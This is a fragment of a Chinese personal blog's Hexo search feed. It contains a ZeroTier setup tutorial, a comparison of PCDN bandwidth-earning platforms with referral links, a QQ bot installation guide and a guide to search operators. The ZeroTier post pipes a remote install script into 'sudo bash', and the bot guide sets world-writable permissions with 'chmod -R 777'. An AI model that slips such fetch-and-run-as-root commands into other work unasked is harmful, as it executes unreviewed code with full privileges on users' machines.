class='item-circle'><p>更新日记-11月</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2022-10-02</p></div></div><div class='timeline-item-content'><ol><li>更新友链朋友圈样式</li></ol></div></div></div>              </div>            </details>              </div>            </details><details class="folding-tag" blue open><summary> 2023年 </summary>              <div class='content'>              <details class="folding-tag" yellow open><summary> 1月 </summary>              <div class='content'>              <div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>更新日记-1月</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2023-01-02</p></div></div><div class='timeline-item-content'><ol><li>修改导航栏项目</li><li>给博客添加了后台，基于<a href="https://github.com/Qexo/Qexo">Qexo</a></li><li>添加<a href="https://blog.dreamfall.cn/talks/">说说</a></li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2023-01-03</p></div></div><div class='timeline-item-content'><ol><li>修复了欢迎信息</li></ol></div></div></div>              </div>            </details>              </div>            </details>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HEXO </tag>
            
            <tag> 博客 </tag>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZeroTier：也许是最好的异地组网解决方案</title>
      <link href="/post/zerotier/"/>
      <url>/post/zerotier/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Zerotier是一款用于构建异地虚拟局域网的工具，让你在世界任何地方访问家里的设备或者其他客户端<br>功能与蒲公英类似</p><ul><li>优点：操作简单、支持设备多、速度快、免费版本支持一百个设备、支持NAT转发</li></ul><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h3 id="账号"><a href="#账号" class="headerlink" title="账号"></a>账号</h3><p>前往<a href="https://my.zerotier.com">zerotier官网</a>注册账号<br>注册登录后你可以看到以下界面<br><img src="https://img.dreamfall.cn/post/zerotier/1.webp" alt="1"><br>选择选择’Create A Network’(创建一个网络)<br>然后系统就会分配一个虚拟网络给你，保存好最左列的’NETWORK ID’后面配置会需要<br>在里面你可自由的配置’Name’网络名称（一点用都没有）、’Access Contral’访问权限（肯定是私人啦）、路由地址和管理你的客户端（反正自定义程度比起蒲公英很高就对了）</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux提供了官方的安装脚本和docker两种方式<br><div class="tabs" id="linux"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#linux-1"><i class="fab fa-linux"></i>脚本</button></li><li class="tab"><button type="button" data-href="#linux-2"><i class="fab fa-docker"></i>docker</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="linux-1"><p>如果您是基于 Debian 和 RPM 的发行版，包括 Debian、Ubuntu、CentOS、RHEL、Fedora 等可以直接在终端中执行下面命令<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -s https://install.zerotier.com | sudo bash</span><br></pre></td></tr></table></figure><br>然后在终端输入<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">zerotier-cli <span class="built_in">join</span> 前面提到的NETWORK ID</span><br></pre></td></tr></table></figure><br>这样Linux端就配置完了，但还不能使用，需要授权，请查看下面网页端配置</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="linux-2"><p>前提：你的Linux系统已经安装了docker</p><ol><li>创建目录以存储ZeroTier的身份和配置<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /var/lib/zerotier-one</span><br></pre></td></tr></table></figure></li><li>获取镜像并运行<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d           \</span><br><span class="line">  --name zt             \</span><br><span class="line">  --restart=always      \</span><br><span class="line">  --device=/dev/net/tun \</span><br><span class="line">  --net=host            \</span><br><span class="line">  --cap-add=NET_ADMIN   \</span><br><span class="line">  --cap-add=SYS_ADMIN   \</span><br><span class="line">  -v /var/lib/zerotier-one:/var/lib/zerotier-one zerotier/zerotier-synology:latest</span><br></pre></td></tr></table></figure></li><li>加入网络<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it zt zerotier-cli <span class="built_in">join</span> 前面提到的NETWORK ID</span><br></pre></td></tr></table></figure>这样Linux端就配置完了，但还不能使用，需要授权，请查看下面网页端配置</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>前往<a href="https://www.zerotier.com/download/">官网</a>下载客户端<br>安装启动后在托盘中可以看到<br><img src="https://img.dreamfall.cn/post/zerotier/2.webp" alt="2"><br>选择join new network<br><img src="https://img.dreamfall.cn/post/zerotier/3.webp" alt="3"><br>输入前面提到的NETWORK ID<br>这样Windows端就配置完了，但还不能使用，需要授权，请查看下面网页端配置</p><h3 id="安卓-IOS"><a href="#安卓-IOS" class="headerlink" title="安卓/IOS"></a>安卓/IOS</h3><p>安装/IOS先下载APP，安装可到Google商店，IOS前往App Store<br>如果你没有Google商店我提供了<a href="https://wws.lanzouh.com/iyxSd06d6hsb?password=28bh">蓝奏云下载</a>，密码’28bh’<br>打开APP<br><img src="https://img.dreamfall.cn/post/zerotier/4.webp" alt="4"><br>点击右上角+号，输入前面提到的NETWORK ID，Add network<br><img src="https://img.dreamfall.cn/post/zerotier/5.webp" alt="5"><br>要使用就点右边的开关就行<br><img src="https://img.dreamfall.cn/post/zerotier/6.webp" alt="6"></p><h3 id="网页端配置（必须）"><a href="#网页端配置（必须）" class="headerlink" title="网页端配置（必须）"></a>网页端配置（必须）</h3><p>先进入网络配置，找到members，将前面的勾打上，通过认证，那么客户端就并入虚拟局域网了，就可以异地访问了<br><img src="https://img.dreamfall.cn/post/zerotier/7.webp" alt="7"></p><h2 id="高级玩法（NAT转发）"><a href="#高级玩法（NAT转发）" class="headerlink" title="高级玩法（NAT转发）"></a>高级玩法（NAT转发）</h2><p>适用于Linux系统，将局域网一台机器当作中转连接整个局域网<br>首先zerotier官网的网段为：192.168.191.0/24，中转设备在zerotier的ip是192.168.191.100<br>找到zerotier端的Advanced，Add Routes，左侧填入个人路由器局域网的网段（也就是中转设备局域网网段），例如我的中转设备在路由器的网段是192.168.1.x，则此处填写192.168.1.0/24，右侧（via）填入上一步记下的地址，例如我的地址是192.168.191.100。<br><img src="https://img.dreamfall.cn/post/zerotier/8.webp" alt="8"><br>接下来配置中转设备<br>开启net.ipv4.ip_forward，在终端输入<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;net.ipv4.ip_forward=1&#x27;</span> &gt;&gt; /etc/sysctl.conf</span><br><span class="line">sysctl -p</span><br><span class="line">iptables -t nat -A POSTROUTING -s 192.168.191.0/24 -j MASQUERADE</span><br></pre></td></tr></table></figure><br>此处的192.168.191.0/24，即为zerotier端的ip所在网段，大家要改成自己的。<br>接下来配置完成，连上zerotier直接能在外使用192.168.1.1就能访问路由器</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果发现安卓/IOS端无法访问请检查use cellular data是否开启<br><img src="https://img.dreamfall.cn/post/zerotier/9.webp" alt="9"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>zerotier虽然配置比蒲公英复杂，但是功能还是很强的，主要是免费</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PCDN：快拿闲置宽带赚钱吧</title>
      <link href="/post/pcdn/"/>
      <url>/post/pcdn/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>由于开发板的性能不足+armv7架构，导致我的很多服务无法运行，于是我购入一台x86的架构PC当做本地服务器。结果就是性能过剩，为了更好的运用多出的算力，所以我在网上冲浪时，寻找可行的<del>折腾方法</del>解决方案。终于，我发现了pcdn业务</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>pcdn全称P2P CDN，中文意思为“P2P内容分发网络”，是以P2P技术为基础，通过挖掘利用边缘网络海量碎片化闲置资源而构建的低成本高品质内容分发网络服务。</p></blockquote><p>简单来说就是利用家庭宽带搭建cdn服务，给视频、直播平台提供分流从而赚取流量费用的业务</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="https://img.dreamfall.cn/post/pcdn/1.webp" alt="原理"></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="个人条件"><a href="#个人条件" class="headerlink" title="个人条件"></a>个人条件</h3><h4 id="宽带"><a href="#宽带" class="headerlink" title="宽带"></a>宽带</h4><p>首先我的宽带是浙江移动，没有公网（移动：公网ip，不存在的），没有多拨。300M的宽带，上行速率在<strong>70Mbps</strong>左右</p><h4 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h4><ul><li>CPU：intel j1900 4核2G（睿频2.4）</li><li>内存：8G ddr3 1333</li><li>硬盘：SSD120G+HDD500G</li><li>系统：unraid 6.9.2（Linux）<h3 id="收益影响"><a href="#收益影响" class="headerlink" title="收益影响"></a>收益影响</h3><h4 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h4><h5 id="上行速率"><a href="#上行速率" class="headerlink" title="上行速率"></a>上行速率</h5>当然是越快越好了<h5 id="NAT类型"><a href="#NAT类型" class="headerlink" title="NAT类型"></a>NAT类型</h5><blockquote><p>NAT（Network Address Translation），是指网络地址转换</p></blockquote></li></ul><p>收益由多到少：<br><strong>卓越公网型&gt;映射公网型&gt;全锥型&gt;IP限制型&gt;端口限制型&gt;对称型</strong><br>因为移动是内网，所以我的业务是在全锥型NAT下跑的<br>对称型几乎没有收益<br>可以开启upnp或者dmz提升NAT等级</p><h5 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h5><p>我的延迟一般都在15ms左右，一般20ms一下都正常</p><h4 id="硬件要求"><a href="#硬件要求" class="headerlink" title="硬件要求"></a>硬件要求</h4><p>具体可参考下表<br><img src="https://img.dreamfall.cn/post/pcdn/2.webp" alt="硬件"><br>我的是500G机械，最好使用固态，因为pcdn对4k读取要求高</p><h4 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h4><p>我都是通过unraid的虚拟机跑pcdn服务分配4核+4.5G内存。</p><h3 id="平台选择"><a href="#平台选择" class="headerlink" title="平台选择"></a>平台选择</h3><p>我花了3个月体验了3个不同的平台，对此我分享一下自己的体验</p><blockquote><p>调度是指平台分配给你业务的情况，假如平台不给你分配业务，你上行再高也没用</p></blockquote><h4 id="甜糖"><a href="#甜糖" class="headerlink" title="甜糖"></a>甜糖</h4><ol><li>宽带要求<br>建议<strong>50Mbps</strong>以下上行带宽使用</li><li>硬件要求<br>docker，手机，电视盒子，电视，pc</li><li>调度情况<br><strong>差</strong>，除了晚高峰时期，别的平均宽带在2m左右</li><li>收益状况<br><u>低</u><br><img src="https://img.dreamfall.cn/post/pcdn/3.webp" alt="甜糖"><blockquote><p>100心愿等于1块钱</p></blockquote></li><li>提现<br>每周四，10元以上提现，6.1%的手续费</li><li>优点<br>支持设备多，性能要求低，宽带要求低</li><li>缺点<br>调度差，收益低</li><li>推荐情况<br>★☆☆☆☆<br>推荐没有设备或宽带低使用<br>不建议有设备和高宽带使用</li></ol><blockquote><p>官网：<a href="https://tiptime.cn/">tiptime.cn</a></p></blockquote><h4 id="点心云"><a href="#点心云" class="headerlink" title="点心云"></a>点心云</h4><ol><li>宽带要求<br>没什么要求，支持1G宽带以上的汇聚</li><li>硬件要求<br>docker，电视盒子（部分），pc</li><li>调度情况<br><strong>高</strong>，白天一般，晚高峰可以跑满</li><li>收益状况<br><u>中</u><br>平均每天1块多<br><img src="https://img.dreamfall.cn/post/pcdn/4.webp" alt="点心云"></li><li>提现<br>每周五，无金额要求，2元手续费</li><li>优点<br>调度高，提现无限制</li><li>缺点<br>需要专门设备，无定向业务</li><li>推荐情况<br>★★★☆☆<br>建议有设备和高宽带使用</li></ol><blockquote><p>官网：<a href="https://dianxinai.com/">dianxinai.com</a></p></blockquote><h4 id="网心云"><a href="#网心云" class="headerlink" title="网心云"></a>网心云</h4><ol><li>宽带要求<br>没什么要求，支持多线汇聚</li><li>硬件要求<br>docker，电视盒子（部分），pc，树莓派，玩客云</li><li>调度情况<br><strong>高</strong>，白天良好，晚高峰可以跑满</li><li>收益状况<br><u>中</u><br><img src="https://img.dreamfall.cn/post/pcdn/5.webp" alt="网心云"><br>平均每天1块多，假期可上2块</li></ol><p>5.提现<br>每周二，无金额要求，支付宝无手续费</p><ol><li>优点<br>调度高，定向业务多，用户多，支持设备多</li><li>缺点<br>硬件要求相对较高</li><li>推荐情况<br>★★★★☆<br>建议有设备和高宽带使用</li></ol><blockquote><p>官网：<a href="https://www.onethingcloud.com/">www.onethingcloud.com</a></p></blockquote><p><strong>邀请链接： <a href="https://act.ionecloud.cn/acts/invite/?inviteid=6e3c775a">网心云-注册</a></strong><br>求求了，让我体验一下邀请奖励吧</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上仅代表我个人收集的数据，具体收益会根据硬件和网络环境不同而变化<br>最终我选择了网心云，毕竟是pcdn大厂，安心</p><blockquote><p>如果想加入的话可以点我通过我的邀请链接注册吗，谢谢<a href="https://act.ionecloud.cn/acts/invite/?inviteid=6e3c775a">网心云</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PCDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的QQ机器人摸索之路</title>
      <link href="/post/qq-bot/"/>
      <url>/post/qq-bot/</url>
      
        <content type="html"><![CDATA[<h2 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h2><p>目前的体验还算不错，机器人我也打算开放使用，理论上能7x24小时运行</p><blockquote><p>可以添加我的机器人QQ：3270963122  去体验 （<a href="https://wpa.qq.com/msgrd?v=3&amp;uin=3270963122&amp;site=qq&amp;menu=yes">一键添加</a>）</p></blockquote><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="功能列表"><a href="#功能列表" class="headerlink" title="功能列表"></a>功能列表</h3><p><img src="https://img.dreamfall.cn/post/qbot/1.webp" alt="功能列表"></p><h3 id="具体功能展示"><a href="#具体功能展示" class="headerlink" title="具体功能展示"></a>具体功能展示</h3><p><img src="https://img.dreamfall.cn/post/qbot/2.webp" alt="新番"><br><img src="https://img.dreamfall.cn/post/qbot/3.webp" alt="点歌"><br><img src="https://img.dreamfall.cn/post/qbot/4.webp" alt="b站解析"><br><img src="https://img.dreamfall.cn/post/qbot/5.webp" alt="图片"><br><img src="https://img.dreamfall.cn/post/qbot/6.webp" alt="抽卡"></p><p>只展示了部分，更多功能请自行体验</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本机器人是根据 <strong><a href="https://github.com/HibiKier/zhenxun_bot">绪山真寻Bot</a></strong> 修改而来（也就是稍微改了一下代码，加了几个插件而已）</p><p>基于 <a href="https://github.com/nonebot/nonebot2">nonebot2</a>  和 <a href="https://github.com/Mrs4s/go-cqhttp">go-cqhttp</a>   开发</p><ul><li>用于官方文档太简单了，所以我还是自己写吧</li></ul><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li>需要到github上的releases中下载对应源码</li></ul><ol><li><p><a href="https://github.com/HibiKier/zhenxun_bot">绪山真寻Bot</a></p></li><li><p><a href="https://github.com/Mrs4s/go-cqhttp">go-cqhttp</a> 下载对应 <strong>系统/架构</strong> 的包</p></li></ol><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ul><li>其实配置也没啥好配置的</li></ul><h4 id="配置-go-cqhttp"><a href="#配置-go-cqhttp" class="headerlink" title="配置 go-cqhttp"></a>配置 go-cqhttp</h4><blockquote><p>配置可以参考 <a href="https://docs.go-cqhttp.org/">官方文档</a> ，还挺详细的</p></blockquote><div class="tabs" id="system1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#system1-1">Windows</button></li><li class="tab"><button type="button" data-href="#system1-2">Linux</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="system1-1"><p>打开powershell或者cmd</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先用CD切换到对应目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再输入下面命令启动go-cqhttp</span></span><br><span class="line"></span><br><span class="line">./go-cqhttp.exe</span><br></pre></td></tr></table></figure><p>根据提示生成运行脚本</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="system1-2"><p>打开终端</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先用CD切换到对应目录</span></span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">chmod</span> -R 777 go-cqhttp <span class="comment">#赋予权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再输入下面命令启动go-cqhttp</span></span><br><span class="line"></span><br><span class="line">./go-cqhttp</span><br></pre></td></tr></table></figure><p>根据提示生成运行脚本</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p><img src="https://img.dreamfall.cn/post/qbot/7.webp" alt="配置"></p><p>选择3: 反向 Websocket 通信</p><ul><li>接下来修改配置文件</li></ul><p>修改QQ账号密码，设置上报数据类型和反向WS Universal 地址</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先修改账号密码</span></span><br><span class="line"></span><br><span class="line"><span class="attr">account:</span> <span class="comment"># 账号相关</span></span><br><span class="line">  <span class="attr">uin:</span> <span class="number">1233456</span> <span class="comment"># QQ账号</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">&#x27;&#x27;</span> <span class="comment"># 密码为空时使用扫码登录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再修改上报数据类型</span></span><br><span class="line"></span><br><span class="line"><span class="attr">message:</span></span><br><span class="line">  <span class="comment"># 上报数据类型</span></span><br><span class="line">  <span class="comment"># 可选: string,array</span></span><br><span class="line">  <span class="attr">post-format:</span> <span class="string">array</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#最后修改反向WS Universal 地址</span></span><br><span class="line"></span><br><span class="line"><span class="attr">servers:</span></span><br><span class="line">  <span class="comment"># 添加方式，同一连接方式可添加多个，具体配置说明请查看文档</span></span><br><span class="line">  <span class="comment">#- http: # http 通信</span></span><br><span class="line">  <span class="comment">#- ws:   # 正向 Websocket</span></span><br><span class="line">  <span class="comment">#- ws-reverse: # 反向 Websocket</span></span><br><span class="line">  <span class="comment">#- pprof: #性能分析服务器</span></span><br><span class="line">  <span class="comment"># 反向WS设置</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ws-reverse:</span></span><br><span class="line">      <span class="comment"># 反向WS Universal 地址</span></span><br><span class="line">      <span class="comment"># 注意 设置了此项地址后下面两项将会被忽略</span></span><br><span class="line">      <span class="attr">universal:</span> <span class="string">ws://127.0.0.1:8080/cqhttp/ws</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="配置-机器人"><a href="#配置-机器人" class="headerlink" title="配置 机器人"></a>配置 机器人</h4><blockquote><p>建议python版本为3.9，如果可以话建议创建虚拟环境以防止不同包之间冲突</p></blockquote><ol><li><p>安装依赖</p> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip isntall -r requirements.txt</span><br></pre></td></tr></table></figure></li><li><p>修改congifs/config.py</p><p> 主要修改的是ALAPI_TOKEN，TL_KEY，以及数据库的有关配置</p> <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># API KEY（必要）</span></span><br><span class="line">RSSHUBAPP: <span class="built_in">str</span> = <span class="string">&quot;https://rsshub.app&quot;</span>  <span class="comment"># rsshub</span></span><br><span class="line">ALAPI_TOKEN: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>  <span class="comment"># ALAPI  https://admin.alapi.cn/user/login</span></span><br><span class="line">HIBIAPI: <span class="built_in">str</span> = <span class="string">&quot;https://api.obfs.dev&quot;</span></span><br><span class="line"><span class="comment"># 图灵</span></span><br><span class="line">TL_KEY: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库（必要）</span></span><br><span class="line"><span class="comment"># 如果填写了bind就不需要再填写后面的字段了#）</span></span><br><span class="line"><span class="comment"># 示例：&quot;bind&quot;: &quot;postgresql://user:password@127.0.0.1:5432/database&quot;</span></span><br><span class="line">bind: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>  <span class="comment"># 数据库连接链接</span></span><br><span class="line">sql_name: <span class="built_in">str</span> = <span class="string">&quot;postgresql&quot;</span></span><br><span class="line">user: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>  <span class="comment"># 数据用户名</span></span><br><span class="line">password: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>  <span class="comment"># 数据库密码</span></span><br><span class="line">address: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>  <span class="comment"># 数据库地址</span></span><br><span class="line">port: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>  <span class="comment"># 数据库端口</span></span><br><span class="line">database: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>  <span class="comment"># 数据库名称</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>这样一来，大部分的配置都完成了</li></ul><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>直接运行</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python bot.py</span><br></pre></td></tr></table></figure><blockquote><p>盲猜这一步会报错，慢慢排查，就能修好</p></blockquote><p>不出意外的话，你的机器人就可以用了</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这机器人害我折腾了好久，nonebot的框架自由度很高，有能力的可以自己开发插件。</p><h3 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h3><p><a href="https://github.com/howmanybots/onebot">Onebot</a><br><a href="https://github.com/Mrs4s/go-cqhttp">go-cqhttp</a><br><a href="https://github.com/nonebot/nonebot2">nonebot2</a><br><a href="https://github.com/Angel-Hair/XUN_Bot">XUN_Langskip</a><br><a href="https://github.com/pcrbot/cappuccilo_plugins#%E7%94%9F%E6%88%90%E5%99%A8%E6%8F%92%E4%BB%B6">cappuccilo_plugins</a><br><a href="https://github.com/MeetWq/nonebot-plugin-withdraw">nonebot-plugin-withdraw</a><br><a href="https://github.com/maxesisn/nonebot_plugin_songpicker2">nonebot_plugin_songpicker2</a><br><a href="https://github.com/Jigsaw111/nonebot_plugin_manager">nonebot_plugin_manager</a><br><a href="https://github.com/H-K-Y/Genshin_Impact_bot">Genshin_Impact_bot</a><br><a href="https://github.com/NothAmor/nonebot2_luxun_says">nonebot2_luxun_says</a><br><a href="https://github.com/Kyomotoi/AnimeThesaurus">AnimeThesaurus</a><br><a href="https://github.com/Ailitonia/omega-miya">omega-miya</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 机器人 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ </tag>
            
            <tag> Bot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜索引擎进阶使用方法</title>
      <link href="/post/search/"/>
      <url>/post/search/</url>
      
        <content type="html"><![CDATA[<h2 id="site"><a href="#site" class="headerlink" title="site:"></a>site:</h2><p>site: 用来搜索某个域名下的所有被搜索引擎收录的文件，适用于所有的搜索引擎。</p><p>另外，site命令还可以限制在某一网站内搜索，site语法把搜索范围局限在这些网站内，以提高搜索效率。</p><ul><li>语法： 关键词 site: 网站（不需要输入http://）</li></ul><p>例子：网站 site:ysbrid.top</p><blockquote><p>谷歌搜索可以 site:.域名后缀 ,来搜索所有是域名后缀的网站</p></blockquote><hr><h2 id="domain"><a href="#domain" class="headerlink" title="domain:"></a>domain:</h2><p>domain查询结果有的叫相关域，有的等同于外部链接。</p><ul><li>语法：domain: 网站</li></ul><p>例子：domain:ysbrid.top</p><hr><h2 id="inurl"><a href="#inurl" class="headerlink" title="inurl:"></a>inurl:</h2><blockquote><p>URL全称Uniform Resource Locator，中文译为“统一资源定位器”，就是地址栏里的内容。</p></blockquote><p>inurl:指令用于搜索查询词出现在url中的页面，百度和Google都支持inurl指令，inurl指令支持中文和英文。</p><ul><li>语法：inurl:关键词</li></ul><p>比如搜索：inurl:搜索引擎优化，返回的结果都是网址url中包含“搜索引擎优化”的页面。</p><blockquote><p>由于关键词出现在url中对排名有一定影响，使用inurl:搜索可以更准确地找到竞争对手。</p></blockquote><hr><h2 id="and"><a href="#and" class="headerlink" title="and"></a>and</h2><p>利用and表示前后两个关键词是“与”的逻辑关系。</p><ul><li>语法：关键词 and 关键词</li></ul><p>例如输入关键词：“梦璃雨落 and 小屋”，就会找出将包含梦璃雨落和小屋有关的网站。</p><blockquote><p>and 可以用空格替代</p></blockquote><hr><h2 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h2><p>利用OR(|)表示前后两个词是“或”的逻辑关系。</p><ul><li>语法：关键词 or(|) 关键词</li></ul><p>例如输入关键词：“梦璃雨落 or 小屋”，会找出将包含梦璃雨落或者小屋的网页。</p><blockquote><p>百度只能用 | ，谷歌可以用OR 和 |</p></blockquote><h2 id="双引号（””）"><a href="#双引号（””）" class="headerlink" title="双引号（””）"></a>双引号（””）</h2><p>把搜索词放在双引号中（英文半角双引号），代表完全匹配搜索一个词，也就是说搜索结果返回的页面包含双引号中出现的所有的词，连顺序也必须完全匹配，目前，百度和Google都支持这个指令。</p><ul><li>语法：”关键词 关键词 关键词“</li></ul><p>例如：搜索“泠鸢yousa”。</p><hr><h2 id="减号（-）"><a href="#减号（-）" class="headerlink" title="减号（-）"></a>减号（-）</h2><p>减号代表搜索不包含减号后面的词的页面，使用这个指令时减号前面必须是空格，减号后面没有空格，紧跟着需要排除的词。</p><ul><li>语法：关键词 -关键词</li></ul><blockquote><p>目前，Google和百度都支持这个指令，例如：“百科 -百度”这个词，却不包含“百度”这个词的结果。</p></blockquote><h2 id="星号（-）"><a href="#星号（-）" class="headerlink" title="星号（*）"></a>星号（*）</h2><p>星号<em>是常用的通配符，也可以用在搜索中，目前，百度不支持</em>号搜索指令。</p><ul><li>语法：关键词*</li></ul><p>比如在Google中搜索“搜索<em>擎”其中的</em>号代表任何文字，返回的结果就不仅包含“搜索引擎”，还包含了“搜索收擎”，“搜索巨擎”等内容。</p><hr><h2 id="intitle"><a href="#intitle" class="headerlink" title="intitle:"></a>intitle:</h2><p>intitle:指令返回的是页面title中包含关键词的页面，目前，百度和Google都支持intitle指令。</p><p>使用intitle指令找到的文件是更准确的竞争页面，如果关键词只出现在页面可见文字中，而没有出现在title中，大部分情况是并没有针对关键词进行优化，所以也不是有力的竞争对手。</p><ul><li>语法：intitle:关键词</li></ul><p>intitle命令还有一种用法，表示后接的词限制在网页标题范围内。</p><p>例如，找明星的个人资料页，一般来说，明星资料页的标题，通常是明星的名字，而在页面上，会有“姓名”、“身高”等词语出现。</p><p>比如：找泠鸢yousa的资料，就可以用“泠鸢yousa 名字 身高”来查询，而由于明星的名字一般在网页标题中出现，因此，更精确的查询方式，可以是“名字 身高 intitle:泠鸢yousa”。</p><hr><h2 id="inanchor"><a href="#inanchor" class="headerlink" title="inanchor:"></a>inanchor:</h2><p>inanchor:指令返回的结果是导入链接锚文字中包含搜索词的页面，目前，百度暂不支持inanchor。</p><ul><li>语法：inanchor:关键词</li></ul><p>当我们用inanchor提交查询的时候，Google会限制结果是那些在网页anchor链接里边包含了查询关键词的网页。</p><p>比如在Google搜索“inanchor:点击这里”返回的结果页面本身并不一定包含“点击这里”这四个字，而是指向这些页面的链接锚文字中出现了“点击这里”这四个字。</p><p>例如：“restaurants inanchor:gourmet”，提交这个查询，Google会查询那些在anchor信息里包含了关键词“restaurants”和关键词“gourmet”的网页。</p><hr><h2 id="filetype"><a href="#filetype" class="headerlink" title="filetype:"></a>filetype:</h2><p>filetype命令对搜索对象的文件类型做限制，冒号后是文档格式，如PDF、DOC、XLS等。</p><ul><li>语法：filetype:扩展名</li></ul><p>当我们在查询里边包含filetype:扩展名的时候，Google会限制查询结果仅返回特定文件类型的网页。</p><blockquote><p>用于搜索特定文件格式，目前，Google和百度都支持filetype指令，比如搜索：“SEO优化 filetype:pdf”，搜索返回的就是包含“SEO优化”这个关键词的所有pdf文件，其它可用的特定文件类型格式查询还有doc、txt、ppt、xls、rtf、swf、ps等。</p></blockquote><hr><h2 id="allinanchor"><a href="#allinanchor" class="headerlink" title="allinanchor:"></a>allinanchor:</h2><p>anchor是一处说明性的文字，它标注说明了这个链接可能跳转到其它的网页，或跳转到当前网页的不同地方，当我们用allinanchor提交查询的时候，Google会限制搜索结果必须是那些在anchor文字里，包含了我们所有查询关键词的网页。</p><p>例如：“allinanchor: best museums Sydney”，提交这个查询，Google仅仅会返回在网页anchor说明文字里边包含了关键词“best”、“museums”和“Sydney”的网页。</p><hr><h2 id="allintext"><a href="#allintext" class="headerlink" 